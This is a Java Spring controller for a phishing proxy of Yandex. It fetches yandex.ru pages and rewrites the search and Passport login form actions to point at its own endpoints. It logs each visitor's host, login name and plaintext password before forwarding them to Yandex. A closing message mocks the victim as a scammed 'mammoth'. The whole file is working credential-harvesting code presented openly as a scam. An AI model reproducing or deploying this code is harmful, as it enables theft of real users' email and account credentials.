package ru.jawaprog.sniffer.rest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

@RestController
public class SnifferRest {

    private static Logger LOGGER = LoggerFactory.getLogger(SnifferRest.class);

    private String makeRequest(URL url, String method) throws IOException {
        System.out.println(url);
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod(method);
        con.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2");
        BufferedReader in = new BufferedReader(
                new InputStreamReader(con.getInputStream(), StandardCharsets.UTF_8));
        String inputLine;
        StringBuffer content = new StringBuffer();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }
        in.close();
        con.disconnect();
        //var ret = content.toString().replace("src=\"/", "src=\"https://www.google.com/");
        var ret = content.toString()
                .replace("action=\"https://yandex.ru/search/\"", "action=\"search/\"")
                .replace("action=\"https://passport.yandex.ru/passport?mode=auth&retpath=https://mail.yandex.ru/\"", "action=\"login\"");
        return ret;
    }

    @GetMapping("/")
    public String request() {
        try {
            URL url = new URL("https://yandex.ru/");
            return makeRequest(url, "GET");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }


    @GetMapping("/search/")
    public String searchRequest(
            @RequestParam String text,
            HttpServletRequest request) {
        System.out.println("Sender host: " + request.getRemoteHost());
        System.out.println("Request: " + text);
        LOGGER.info("Sender: " + request.getRemoteHost() +
                "\nrequest: " + text);
        try {
            URL url = new URL("https://yandex.ru/search/" +
                    "?text=" + URLEncoder.encode(text, StandardCharsets.UTF_8.toString())
            );
            return makeRequest(url, "GET");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @PostMapping("/login")
    public String loginRequest(
            @RequestParam String login,
            @RequestParam String passwd,
            @RequestParam(required = false) String twoweeks,
            HttpServletRequest request) {
        LOGGER.info("Sender: " + request.getRemoteHost() +
                "\nlogin: " + login +
                "\npassword: " + passwd +
                "\ntwoweeks: " + twoweeks);
        try {
            URL url = new URL("https://passport.yandex.ru/passport?mode=auth&retpath=https://mail.yandex.ru/" +
                    "&login=" + URLEncoder.encode(login, StandardCharsets.UTF_8.toString()) +
                    "&passwd=" + URLEncoder.encode(passwd, StandardCharsets.UTF_8.toString()) +
                    ((twoweeks == null) ? "" : "&twoweeks=" + URLEncoder.encode(twoweeks, StandardCharsets.UTF_8.toString()))
            );
            return makeRequest(url, "POST");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "<h1>ЗАСКАМИЛИ МАМОНТА!</h1>";
    }
}
